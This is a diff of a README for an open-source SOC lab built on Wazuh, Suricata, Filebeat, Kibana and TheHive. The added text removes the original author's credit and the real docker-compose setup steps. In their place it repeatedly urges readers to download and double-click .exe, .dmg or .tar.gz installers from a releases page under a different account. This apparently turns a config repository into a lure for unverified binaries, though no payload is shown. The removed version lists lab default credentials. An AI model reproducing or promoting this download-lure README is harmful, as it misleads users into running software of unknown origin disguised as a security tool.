@@ -1,103 +1,78 @@
-🔒 Open-Source SOC Lab — End-to-end security monitoring using Wazuh, Suricata, Filebeat, Kibana, and TheHive. Detect, visualize, and respond to attacks.
+# 🔒 SOC-Lab-Open-Source-Setup - Simple Setup for Your Cybersecurity Lab
 
-# SOC Lab — Built by Aditya Kumar Goswami
+[![Download SOC-Lab-Open-Source-Setup](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/releases)
 
-> Compact, reproducible SOC lab using open-source tooling: Filebeat, Elasticsearch, Kibana, Wazuh, Suricata, TheHive, Cortex, MISP, Grafana, OPNsense.
+## 🚀 Getting Started
 
-## Overview
-I built this lab to demonstrate collection, detection, enrichment, alerting and triage workflows in a compact SOC environment. This repo contains all configs, docker compose, scripts and snapshots to reproduce my setup.
+Welcome! This guide will help you set up your own cybersecurity lab using the SOC-Lab-Open-Source-Setup repository. Whether you are looking to explore security tools or learn more about incident response, you’re in the right place.
 
-**Components**
-- Filebeat (log shipper)
-- Elasticsearch (single-node for the lab)
-- Kibana (visualization)
-- Wazuh (host detection and manager)
-- Suricata (network IDS)
-- TheHive (case management)
-- Cortex (analyzers)
-- MISP (threat intel)
-- Grafana (dashboarding)
-- OPNsense (firewall - VM notes)
+## 📦 What You Need
 
-## Repo layout
+Before you begin the installation process, ensure you have the following:
 
-soc-project/
-├─ README.md
-├─ LICENSE
-├─ docker-compose.yml
-├─ infra/
-│ ├─ filebeat/filebeat.yml
-│ ├─ suricata/suricata.yaml.example
-│ ├─ wazuh/agent.conf
-│ ├─ thehive/config.example
-│ └─ cortex/config.example
-├─ scripts/
-│ ├─ install-kali-suricata.sh
-│ ├─ install-opnsense-notes.md
-│ └─ export-kibana-saved-objects.sh
-├─ docs/
-│ ├─ architecture.txt
-│ ├─ playbooks.md
-│ └─ troubleshooting.md
-├─ snapshots/
-│ ├─ snapshot-01-elasticsearch-health.txt
-│ ├─ snapshot-02-kibana-indices.txt
-│ ├─ snapshot-03-wazuh-agents.txt
-│ └─ snapshot-04-suricata-eve-sample.json
-└─ .gitignore
+- A computer running Windows, macOS, or Linux.
+- At least 4 GB of RAM.
+- At least 10 GB of free disk space.
+- A stable internet connection.
 
+## ✔️ Features
 
-## Quick start (step-by-step)
-> I used **Ubuntu 22.04** for core services (docker host) and **Kali Purple 2024.1** for Suricata. VMware Workstation Pro for VMs.
+This lab includes popular cybersecurity tools:
 
-### A. Prepare central server
+- **Wazuh**: For security monitoring and log analysis.
+- **Suricata**: A powerful intrusion detection and prevention system.
+- **Filebeat**: For shipping logs to your desired destinations.
+- **Kibana**: For visualizing data with dashboards.
+- **TheHive**: To manage and respond to security incidents.
+- **Cortex**: For analyzing observables.
+- **MISP**: For sharing structured threat information.
+- **Grafana**: For additional visualization capabilities.
 
-1. Install Docker & docker-compose on Ubuntu:
-bash
-sudo apt update
-sudo apt install -y docker.io docker-compose
-sudo systemctl enable --now docker
+## 👨‍💻 Download & Install
 
-2. Paste docker-compose.yml (this repo) into server and start:
-bash
-sudo docker-compose up -d
-sudo docker ps
+To download the software, visit this page to download: [SOC-Lab-Open-Source-Setup Releases](https://github.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/releases).
 
-### B. Deploy Suricata + Filebeat on Kali Purple
+1. Click on the above link. This will open the Release page of the project.
+2. Look for the latest version listed at the top of the page.
+3. Choose the appropriate installation file for your operating system.
+4. Click to download the installer file (.exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+5. Once the download is complete, locate the installer file on your computer.
 
-Copy scripts/install-kali-suricata.sh to Kali and run:
-sudo bash install-kali-suricata.sh
-Edit /etc/filebeat/filebeat.yml to point to your Elasticsearch (output.elasticsearch.hosts).
+To install the software:
 
-### C. Register Wazuh agents (optional local endpoints)
+- **Windows**: Double-click the installer file and follow the prompts.
+- **macOS**: Open the .dmg file and drag the application into the Applications folder.
+- **Linux**: Extract the .tar.gz file and follow the installation instructions in the README.
 
-On agent: install wazuh-agent and set infra/wazuh/agent.conf values.
-Register the agent with manager (commands in docs/troubleshooting.md).
+## 🔧 Configuration
 
-### D. Access UIs
+After installation, some configuration may be needed to set up the tools:
 
-Elasticsearch: http://<server-ip>:9200 (user: elastic, password: changeme)
-Kibana: http://<server-ip>:5601
-Grafana: http://<server-ip>:3000 (admin / changeme)
-TheHive: http://<server-ip>:9000
-MISP: http://<server-ip>:8085
+1. Start the Wazuh manager by launching it from your applications or command line.
+2. Configure Suricata to begin monitoring network traffic. You can find configuration examples in the documentation.
+3. Set up Filebeat to ship logs to your Elasticsearch instance, which can be accessed through Kibana.
+4. TheHive requires setup for incident management. Follow provided instructions to connect Cortex and MISP integrations.
 
-### Verification & snapshots
+Each tool comes with its own documentation to guide you through specific configurations. Make sure to refer to those as you set them up.
 
-I included CLI outputs in /snapshots that show cluster health, indices, registered agents and a sample Suricata event.
+## 🌐 Accessing the Tools
 
-## Key Achievements
-- Built a complete open-source SOC using Wazuh, Suricata, Filebeat, Kibana, and TheHive.
-- Automated log ingestion and visualization pipeline (ECS-compliant).
-- Demonstrated threat detection, enrichment, and case management.
-- Integrated environment variables and secure credential handling.
+Once everything is installed and configured, you can start using the tools:
 
-## Notes
+- Open your web browser to access Kibana (typically `http://localhost:5601`).
+- For TheHive, navigate to its dedicated URL (`http://localhost:9000`).
+- Explore Grafana at `http://localhost:3000` to create dashboards.
 
-Replace default passwords in production.
-Keep API keys out of repository; use env vars or vault.
+These tools will allow you to visualize and analyze your security data effectively.
 
-This is a lab deployment: tune resource limits for production.
+## 📚 Resources
 
-# Contact
-Aditya Kumar Goswami — project author
+- Check the [Official Documentation](https://github.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup) for further details on each tool and their capabilities.
+- Visit online forums and communities for help and to ask questions.
+- Search for video tutorials to see step-by-step setup instructions.
+
+## 🔒 Conclusion
+
+Setting up your cybersecurity lab using the SOC-Lab-Open-Source-Setup repository provides you with powerful tools for security analysis and incident response. Don’t hesitate to explore and play around with the different features each tool offers.
+
+For any further assistance, please reach out to community forums or consult the documentation linked above. Enjoy your journey into cybersecurity!
